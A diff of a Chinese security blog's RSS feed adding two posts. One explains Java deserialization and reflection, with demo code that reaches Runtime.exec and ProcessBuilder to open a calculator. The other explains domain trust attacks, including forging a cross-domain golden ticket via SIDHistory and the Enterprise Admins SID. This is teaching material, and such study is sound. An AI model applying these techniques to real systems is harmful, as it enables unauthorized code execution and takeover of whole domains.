@@ -6,7 +6,615 @@
         <description>Recent content on cOOl &#39;s blog</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
-        <lastBuildDate>Sat, 01 Jan 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://coollllllll.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Thu, 10 Mar 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://coollllllll.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>java 反序列化-1</title>
+        <link>https://coollllllll.github.io/p/java-1/</link>
+        <pubDate>Thu, 10 Mar 2022 00:00:00 +0000</pubDate>
+        
+        <guid>https://coollllllll.github.io/p/java-1/</guid>
+        <description>&lt;img src="https://coollllllll.github.io/p/java-1/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg" alt="Featured image of post java 反序列化-1" /&gt;&lt;h1 id=&#34;java-反序列化-1&#34;&gt;java 反序列化-1&lt;/h1&gt;
+&lt;h2 id=&#34;基础&#34;&gt;基础&lt;/h2&gt;
+&lt;h3 id=&#34;相关方法&#34;&gt;相关方法&lt;/h3&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 序列化
+ObjectOutputStream 类的 writeObject()
+
+# 反序列化
+ObjectInputStream 类的 readObject()
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;前提&#34;&gt;前提&lt;/h3&gt;
+&lt;p&gt;实现 &lt;code&gt;java.io.Serializable&lt;/code&gt; 接口才可被反序列化，而且所有属性必须是可序列化的(用 &lt;code&gt;transient&lt;/code&gt; 关键字修饰的属性除外，不参与序列化过程)。&lt;/p&gt;
+&lt;h2 id=&#34;基本原理&#34;&gt;基本原理&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;Demo：&lt;/strong&gt;&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;public static void main (String args[]) throws Exception {
+    String obj = &amp;quot;hello world!&amp;quot;;
+    
+    // 创建一个包含对象进行反序列化信息的”object”数据文件
+    FileOutputStream fos = new FileOutputStream(&amp;quot;object&amp;quot;);
+    ObjectOutputStream os = new ObjectOutputStream(fos);
+    
+    // writeObject()方法将obj对象写入object文件
+    
+    os.writeObject(obj);
+    os.close();
+    
+    // 从文件中反序列化obj对象
+    FileInputStream fis = new FileInputStream(&amp;quot;object&amp;quot;);
+    ObjectInputStream ois = new ObjectInputStream(fis);
+    
+    // 恢复对象
+    String obj2 = (String)ois.readObject();
+    System.out.print(obj2);
+    ois.close();
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
+&lt;li&gt;序列化后写入 object 文件的数据如下&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 1010; 
+			flex-basis: 2424px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/java-1/image-20220313210555398.png&#34; data-size=&#34;879x87&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/java-1/image-20220313210555398.png&#34;
+			width=&#34;879&#34;
+			height=&#34;87&#34;
+			srcset=&#34;https://coollllllll.github.io/p/java-1/image-20220313210555398_hu27c0e7a514bc3bd3e9249cb929cf2024_8829_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/java-1/image-20220313210555398_hu27c0e7a514bc3bd3e9249cb929cf2024_8829_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;序列化后的数据开头包含两字节的魔术数字：&lt;code&gt;ACED&lt;/code&gt;。接下来是两字节的版本号 &lt;code&gt;0005&lt;/code&gt; 的数据。此外还包含了类名、成员变量的类型和个数等。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;写入 object 后，使用&lt;code&gt;readObject&lt;/code&gt;方法读取序列化后的数据&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 640; 
+			flex-basis: 1536px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/java-1/image-20220313211009425.png&#34; data-size=&#34;525x82&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/java-1/image-20220313211009425.png&#34;
+			width=&#34;525&#34;
+			height=&#34;82&#34;
+			srcset=&#34;https://coollllllll.github.io/p/java-1/image-20220313211009425_huf357fa920edd07d76831133f2ef00fe7_8229_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/java-1/image-20220313211009425_huf357fa920edd07d76831133f2ef00fe7_8229_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;image-20220313211009425&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20220313211009425&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;漏洞就发生在当&lt;code&gt;readObject()&lt;/code&gt; 方法被重写，反序列化该类时调用便是重写后的 &lt;code&gt;readObject()&lt;/code&gt; 方法。如果该方法使用不当的话就有可能引发恶意代码的执行。&lt;/p&gt;
+&lt;p&gt;例如：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;class MyObject implements Serializable{
+    public String name;
+    // 重写readObject()方法
+    private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException{
+        // 执行默认的readObject()方法
+        in.defaultReadObject();
+        // 执行打开计算器程序命令
+        Runtime.getRuntime().exec(name);
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;当进行对象的反序列化时，就会执行&lt;code&gt;readObject&lt;/code&gt;方法里的命令执行方法：&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 229; 
+			flex-basis: 551px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/java-1/image-20220313212213010.png&#34; data-size=&#34;2131x928&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/java-1/image-20220313212213010.png&#34;
+			width=&#34;2131&#34;
+			height=&#34;928&#34;
+			srcset=&#34;https://coollllllll.github.io/p/java-1/image-20220313212213010_hu926cb49c5044207f8f1df22bf577f766_293445_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/java-1/image-20220313212213010_hu926cb49c5044207f8f1df22bf577f766_293445_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;实际情况下的反序列化会比较复杂，与 java 各类特性相关。&lt;/p&gt;
+&lt;h2 id=&#34;java-反射特性&#34;&gt;Java 反射特性&lt;/h2&gt;
+&lt;p&gt;反射是大部分语言都有的，对象可以通过反射获取他的类，类可以通过反射拿到所有方法（包括私有），拿到的⽅法可以调用，总之通过&lt;strong&gt;反射&lt;/strong&gt;，可以将Java这种静态语言附加上动态特性。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;动态特性：&lt;/p&gt;
+&lt;p&gt;⼀段代码，改变其中的变量，将会导致这段代码产⽣功能性的变化&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;例如如下 Demo, 当不知道传入参数值时，是无法晓得他的实际作用。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Demo1：&lt;/strong&gt;&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;public void execute(String className, String methodName) throws Exception {
+ Class clazz = Class.forName(className);
+ clazz.getMethod(methodName).invoke(clazz.newInstance());
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;上述例子中包含了几个重要的与反射相关的方法：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;获取类对象的方法：&lt;code&gt;forName&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;实例化类对象的方法：&lt;code&gt;newInstance&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;获取函数的方法：&lt;code&gt;getMethod&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;执行函数的方法：&lt;code&gt;invoke&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;获取类对象的方法&#34;&gt;获取类对象的方法&lt;/h3&gt;
+&lt;p&gt;Java 中类本身也是一个对象，&lt;code&gt;java.lang.Class&lt;/code&gt; 类的实例，这个实例称为类对象：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;类对象用于提供类本身的信息，比如有几种构造方法， 有多少属性，有哪些普通方法&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;想要获得一个类的属性和方法，就必须先获得该类的类对象。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;方法：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;obj.getClass() &lt;/code&gt;如果上下文中存在某个类的实例 obj ，可以直接通过 &lt;code&gt;obj.getClass() &lt;/code&gt;来获取它的类&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;Test.class &lt;/code&gt;如果已经加载了某个类，只是想获取到它的 &lt;code&gt;java.lang.Class &lt;/code&gt;对象，那么就直接拿它的 class 属性即可。这个方法其实不属于反射&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;Class.forName &lt;/code&gt;如果知道某个类的名字，想获取到这个类，就可以使用 forName 来获取&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;利用类对象创建实例&#34;&gt;利用类对象创建实例&lt;/h3&gt;
+&lt;p&gt;假设目前有一个Person类：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;public class Person implements Serializable {
+    private String name;
+    private Integer age;
+
+    public Person(String name, Integer age) {
+        this.name = name;
+        this.age = age;
+    }
+
+    public String getName() {
+        return this.name;
+    }
+    public Integer getAge() {
+        return this.age;
+    }
+    
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;与直接&lt;code&gt;new Person()&lt;/code&gt;不同，基于反射必须先拿到类对象，然后通过类对象获取构造器对象，再通过构造器对象创建一个对象。&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;public static void main (String args[]) throws Exception {
+    Class PersonClass = Class.forName(&amp;quot;Person&amp;quot;);
+    Constructor constructor = PersonClass.getConstructor(String.class, Integer.class);
+    Person p = (Person)constructor.newInstance(&amp;quot;cool&amp;quot;, 18);
+
+    System.out.println(p.getName());
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;有了实例，就可以访问其属性，使用其方法。&lt;/p&gt;
+&lt;h3 id=&#34;利用反射执行代码&#34;&gt;利用反射执行代码&lt;/h3&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;// java.lang.Runtime.getRuntime().exec(&amp;quot;calc.exe&amp;quot;);
+Class clazz = Class.forName(&amp;quot;java.lang.Runtime&amp;quot;);
+clazz.getMethod(&amp;quot;exec&amp;quot;, String.class).invoke(clazz.getMethod(&amp;quot;getRuntime&amp;quot;).invoke(clazz),
+&amp;quot;calc.exe&amp;quot;);
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;上述代码本质上就是调用了&lt;code&gt;java.lang.Runtime.getRuntime().exec(&amp;quot;calc.exe&amp;quot;)&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;使用到了&lt;code&gt;getMethod&lt;/code&gt;和&lt;code&gt;invoke&lt;/code&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;getMethod&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;code&gt;getMethod&lt;/code&gt; 的作用是通过反射获取一个类的某个特定的公有方法。Java中支持类的重载，不能仅通过函数名来确定一个函数。所以，在调用 getMethod 的时候，需要传给他需要获取的函数的参数类型列表。&lt;/p&gt;
+&lt;p&gt;而这里&lt;code&gt;Runtime.exec&lt;/code&gt;有6个重载：&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 331; 
+			flex-basis: 796px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/java-1/image-20220313221949328.png&#34; data-size=&#34;697x210&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/java-1/image-20220313221949328.png&#34;
+			width=&#34;697&#34;
+			height=&#34;210&#34;
+			srcset=&#34;https://coollllllll.github.io/p/java-1/image-20220313221949328_hud8f72b4e66c691f776ed84543815d95a_71681_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/java-1/image-20220313221949328_hud8f72b4e66c691f776ed84543815d95a_71681_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;image-20220313221949328&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20220313221949328&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;这里使用第一个，所以使用&lt;code&gt;getMethod(&amp;quot;exec&amp;quot;, String.class)&lt;/code&gt;获取到了第一个方法。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;invoke&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;invoke 的作用是执行方法，它的第一个参数是：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;如果这个方法是一个普通方法，那么第一个参数是类对象
+如果这个方法是一个静态方法，那么第一个参数是类
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;正常执行方法是 [1].method([2], [3], [4]&amp;hellip;) ，在反射里就是 method.invoke([1], [2], [3], [4]&amp;hellip;) 。&lt;/p&gt;
+&lt;p&gt;所以上述例子可分解为：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;class clazz = Class.forName(&amp;quot;java.lang.Runtime&amp;quot;);
+Method execMethod = clazz.getMethod(&amp;quot;exec&amp;quot;, String.class);
+Method getRuntimeMethod = clazz.getMethod(&amp;quot;getRuntime&amp;quot;);
+Object runtime = getRuntimeMethod.invoke(clazz);
+execMethod.invoke(runtime, &amp;quot;calc.exe&amp;quot;);
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;另一种常用的执行命令的方式是 &lt;code&gt;ProcessBuilder&lt;/code&gt;，通过反射来获取其构造函数，然后调用 &lt;code&gt;start()&lt;/code&gt; 来执行命令:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Class clazz = Class.forName(&amp;quot;java.lang.ProcessBuilder&amp;quot;);
+
+clazz.getMethod(&amp;quot;start&amp;quot;).invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(&amp;quot;open&amp;quot;, &amp;quot;/System/Applications/Calculator.app&amp;quot;)));
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;获取私有方法&#34;&gt;获取私有方法&lt;/h3&gt;
+&lt;p&gt;当一个方法是私有方法(例如私有构造函数)，能否通过反射执行它？&lt;/p&gt;
+&lt;p&gt;使用&lt;code&gt;getDeclared &lt;/code&gt;系列的反射，它与普通的 &lt;code&gt;getMethod 、 getConstructor&lt;/code&gt; 区别：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;getMethod&lt;/code&gt; 系列方法获取的是当前类中所有公共方法，包括从父类继承的方法&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;getDeclaredMethod&lt;/code&gt; 系列方法获取的是当前类中“声明”的方法，是实在写在这个类里的，包括私有的方法，但从父类里继承来的就不包含了&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;code&gt;getDeclaredMethod &lt;/code&gt;的具体用法和 &lt;code&gt;getMethod&lt;/code&gt; 类似， &lt;code&gt;getDeclaredConstructor&lt;/code&gt; 的具体用法 &lt;code&gt;getConstructor &lt;/code&gt;类似。&lt;/p&gt;
+&lt;p&gt;例如，Runtime这个类的构造函数是私有的，之前需要用 &lt;code&gt;Runtime.getRuntime()&lt;/code&gt; 来获取对象。其实现在也可以直接用 &lt;code&gt;getDeclaredConstructor()&lt;/code&gt; 来获取这个私有的构造方法来实例化对象，进而执行命令：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;class clazz = Class.forName(&amp;quot;java.lang.Runtime&amp;quot;);
+Constructor m = clazz.getDeclaredConstructor();
+m.setAccessible(true);  // 获取到一个私有方法后，必须用 setAccessible 修改它的作用域，否则仍然不能调用
+clazz.getMethod(&amp;quot;exec&amp;quot;, String.class).invoke(m.newInstance(), &amp;quot;calc.exe&amp;quot;);
+&lt;/code&gt;&lt;/pre&gt;</description>
+        </item>
+        <item>
+        <title>基于域信任关系的域攻击</title>
+        <link>https://coollllllll.github.io/p/intranet-14/</link>
+        <pubDate>Tue, 01 Mar 2022 00:00:00 +0000</pubDate>
+        
+        <guid>https://coollllllll.github.io/p/intranet-14/</guid>
+        <description>&lt;img src="https://coollllllll.github.io/p/intranet-14/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg" alt="Featured image of post 基于域信任关系的域攻击" /&gt;&lt;h1 id=&#34;基于域信任关系的域攻击&#34;&gt;基于域信任关系的域攻击&lt;/h1&gt;
+&lt;h2 id=&#34;域信任&#34;&gt;域信任&lt;/h2&gt;
+&lt;p&gt;建立域之间的信任关系，是为了一个域的用户能方便地访问其他域的资源，同时也方便了对域网络的管理和维护。这种模式在带来便利的同时，也存在很多可被恶意攻击者利用的地方。&lt;/p&gt;
+&lt;p&gt;域信任关系可以是**单向\双向信任、可传递\不可传递信任、内部\外部信任、跨域链接信任(cross link trust)**等类型。&lt;/p&gt;
+&lt;p&gt;例如，2 个域之间有单向可传递的外部信任关系。同一个森林(Forest)内部的域信任关系，一般隐含为双向可传递的内部信任关系。&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 178; 
+			flex-basis: 427px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-14/image-20220303203923876.png&#34; data-size=&#34;1414x793&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-14/image-20220303203923876.png&#34;
+			width=&#34;1414&#34;
+			height=&#34;793&#34;
+			srcset=&#34;https://coollllllll.github.io/p/intranet-14/image-20220303203923876_hua9b3249351f6e1b78e88d8280f09bf0d_477399_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-14/image-20220303203923876_hua9b3249351f6e1b78e88d8280f09bf0d_477399_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h3 id=&#34;各类关系&#34;&gt;各类关系&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;加入一个新的域到已存在的森林里：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 143; 
+			flex-basis: 345px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-14/image-20220303204547364.png&#34; data-size=&#34;1037x721&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-14/image-20220303204547364.png&#34;
+			width=&#34;1037&#34;
+			height=&#34;721&#34;
+			srcset=&#34;https://coollllllll.github.io/p/intranet-14/image-20220303204547364_huce82cf505d7780b60d794b9cbbbb15f1_329806_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-14/image-20220303204547364_huce82cf505d7780b60d794b9cbbbb15f1_329806_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;父子信任关系&lt;/strong&gt;是最常见的域信任关系，在同一个森林内部，加入一个新域时，最常见的是子域模式(Parent- Child)，或者是树根模式(Tree-Root)，这两种模式分别会建立&lt;strong&gt;父子信任\树根信任关系，都是双向可传递的内部信任关系&lt;/strong&gt;。&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 180; 
+			flex-basis: 433px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-14/image-20220303210159838.png&#34; data-size=&#34;1447x802&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-14/image-20220303210159838.png&#34;
+			width=&#34;1447&#34;
+			height=&#34;802&#34;
+			srcset=&#34;https://coollllllll.github.io/p/intranet-14/image-20220303210159838_hubb7d87a7e28ff78b2a087d77a4ec99a9_239731_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-14/image-20220303210159838_hubb7d87a7e28ff78b2a087d77a4ec99a9_239731_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;父子域一般会存在域名上的规律，TreeRoot方式则没有&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;strong&gt;跨域链接信任&lt;/strong&gt;（cross link)，指的是在同一个森林的两个子域间建立直接的信任关系。因为在同一个森林中，域的组织关系是树状结构，从一个子域到另外一个域，需要从树枝的子域顺寻到根域(Forest Root)，然后从根域继续顺寻到另外一个子域，而跨域链接相当于 在 2 个子域之间直接建立了一个快捷方式的信任关系，以减少认证和授权的时间和步骤。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;内部信任&lt;/strong&gt;指的是森林内部域之间的信任关系。相应地，&lt;strong&gt;外部信任&lt;/strong&gt;(External Domain Trust)指的是域和所在森林之外的域之间的信任关系。&lt;/p&gt;
+&lt;h2 id=&#34;跨域认证和资源访问授权&#34;&gt;跨域认证和资源访问授权&lt;/h2&gt;
+&lt;p&gt;当 2 个域之间建立域信任关系时，会建立共享的&lt;code&gt;域间密钥&lt;/code&gt;(Inter-Realm Key，简写为&lt;code&gt;IRKey&lt;/code&gt;)，其作用相当于 &lt;code&gt;Krbtgt&lt;/code&gt;，只不过 &lt;code&gt;IRKey&lt;/code&gt; 用于相互信任的 2 个域之间的认 证，而 Krbtgt 用于同一个域服务器的 AC 和 KDC 之间的认证。&lt;/p&gt;
+&lt;p&gt;信任域之间的认证授权过程，与同一个域中的认证授权大抵相似，但仍然有不少区别。&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 138; 
+			flex-basis: 333px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-14/image-20220303212631882.png&#34; data-size=&#34;1192x859&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-14/image-20220303212631882.png&#34;
+			width=&#34;1192&#34;
+			height=&#34;859&#34;
+			srcset=&#34;https://coollllllll.github.io/p/intranet-14/image-20220303212631882_hu0424d02716859ca33f8eed28cca1adca_635709_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-14/image-20220303212631882_hu0424d02716859ca33f8eed28cca1adca_635709_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Jack 向 DC1 发起认证请求，数据由 Jack 的口令 NTLM 值加密&lt;/li&gt;
+&lt;li&gt;DC1 使用 Jack 的口令 NTLM 值验证收到的认证请求，返回一个通过认证的 TGT 票据给 Jack&lt;/li&gt;
+&lt;li&gt;Jack 使用 TGT 票据，向 DC1 发起授权请求，发起 请求访问 DC2 中文件服务的 TGS_REQ&lt;/li&gt;
+&lt;li&gt;DC1 检查到文件服务在 DC2 中，返回一个&lt;strong&gt;可转投的 TGT(Referral TGT)&lt;/strong&gt;，指明需转投到 DC2，&lt;strong&gt;使用 IRKey 加密可转投 TGT 中的认证信息&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;Jack 收到可转投的 TGT 后，根据提示信息，使用转投 TGT，发起访问 DC2 中文件服务的请求 TGS_REQ&lt;/li&gt;
+&lt;li&gt;DC2 收到请求后，&lt;strong&gt;使用 IRKey 验证可转投 TGT 中的认证信息&lt;/strong&gt;，返回一个允许访问文件服务的 TGS 票据，票据中部分信息使用运行文件服务的服务账号的口令 NTLM 值加密&lt;/li&gt;
+&lt;li&gt;Jack 使用收到的 TGS 票据访问 DC2 中的文件服务&lt;/li&gt;
+&lt;li&gt;文件服务的服务账号使用口令 NTLM 值校验 TGS，成功则允许访问&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;当 2 个域之间建立信任关系时，会在&lt;strong&gt;全局域数据库中存档对方的 SPN、DNS 等信息，方便访问时进行查询&lt;/strong&gt;。例如，上图中，DC1 会存档 DC2 中所有的服务 SPN、DNS 等信息。&lt;/p&gt;
+&lt;p&gt;如果 Jack 请求访问的服务在 DC1 的全局数据库中，则会返回转投 TGT，如果不在，如果 DC1 有父域，则 DC1 会向父域请求直至森林的根域服务器，如果 DC1 本身是根服务器(本例中 DC1 是根域服务器)，则直接告诉 Jack，请求访问的服务不存在。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;一个森林只有一个全局数据库(根域内)。但是森林内部存在的cross link信任关系不会存于这个全局数据库。&lt;/strong&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;当未建立信任关系时，森林内部想要跨域访问，必须逐级往上到根域，再顺寻到目标域；当建立信任关系后(森林内部跨链接信任或森林间信任)，则会在找到根域之后直接返回转投TGT。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;sidhistory-版跨域黄金票据&#34;&gt;SIDHistory 版跨域黄金票据&lt;/h2&gt;
+&lt;h3 id=&#34;非跨域黄金票据&#34;&gt;非跨域黄金票据&lt;/h3&gt;
+&lt;p&gt;在一个域中，一旦我们获取 Krbtgt 的 NTLM 值，则可以构造黄金票据，伪造成域内任意用户，包括管理员，获取对域的完全访问控制权限。但是在同一个森林的不同域中，黄金票据不再有效。&lt;/p&gt;
+&lt;p&gt;黄金票据的几大要素：域名、域的SID(Security Identifier)、本域 Krbtgt 用户口令 NTLM 值、想伪造票据的用户 RID(Relative Identifier，在无特别指明情况下，Mimikatz 工具会设置 RID 为域管理员的 RID)。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;不同的域有不同的 Krbtgt，导致黄金票据在不同的域之间失效。&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 153; 
+			flex-basis: 367px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-14/image-20220303221125974.png&#34; data-size=&#34;1058x691&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-14/image-20220303221125974.png&#34;
+			width=&#34;1058&#34;
+			height=&#34;691&#34;
+			srcset=&#34;https://coollllllll.github.io/p/intranet-14/image-20220303221125974_hu91ec14b53c794fea2dcc6033b8a4ed3a_344979_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-14/image-20220303221125974_hu91ec14b53c794fea2dcc6033b8a4ed3a_344979_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h3 id=&#34;跨域版黄金票据&#34;&gt;跨域版黄金票据&lt;/h3&gt;
+&lt;p&gt;如果一个用户的 &lt;code&gt;SIDHistory&lt;/code&gt; 属性被设置为高权限组或者用户的 &lt;code&gt;ID&lt;/code&gt;，则该用户也具备等同于高权限组或者用户的权限。如果我们伪造的黄金票据中加入目标域的域管理员组的 &lt;code&gt;SID&lt;/code&gt;，则可以获取目标域的域管理员权限，&lt;code&gt;黄金票据&lt;/code&gt;和 &lt;code&gt;SIDHistory&lt;/code&gt; 的结合，可实现跨域黄金票据。&lt;/p&gt;
+&lt;p&gt;由于每个域的 &lt;code&gt;SID&lt;/code&gt; 都不同，叠加 &lt;code&gt;SIDHistory&lt;/code&gt; 的黄金票据不具备通用性。&lt;strong&gt;根据微软的描述，在同一个域森林内部，企业管理组 &lt;code&gt;EA(Enterprise Administrators)&lt;/code&gt; 会自动被森林内部所有域加入到本域的域管理员组，且 &lt;code&gt;EA&lt;/code&gt; 只存在于根域中，所以企业管理组 &lt;code&gt;EA&lt;/code&gt; 的 &lt;code&gt;SID&lt;/code&gt; 固定为根域的 &lt;code&gt;SID&lt;/code&gt; 加上固定的 &lt;code&gt;RID&lt;/code&gt; 即 &lt;code&gt;519&lt;/code&gt;。&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;因此，如果将使用企业管理组EA的SID设置SIDHistory属性，和黄金票据结合，则在只获取任意一个域krbtgt账号NTLM值的前提下，可实现森林内所有域的跨 域黄金票据，这种票据可简称为&lt;strong&gt;SIDHistory版黄金票据&lt;/strong&gt;。&lt;/p&gt;
+&lt;p&gt;当然也可以&lt;strong&gt;添加指定域的管理员SID为SIDHistory，这种黄金票据只对当前指定域有效，对其他域无效。&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 144; 
+			flex-basis: 346px&#34;
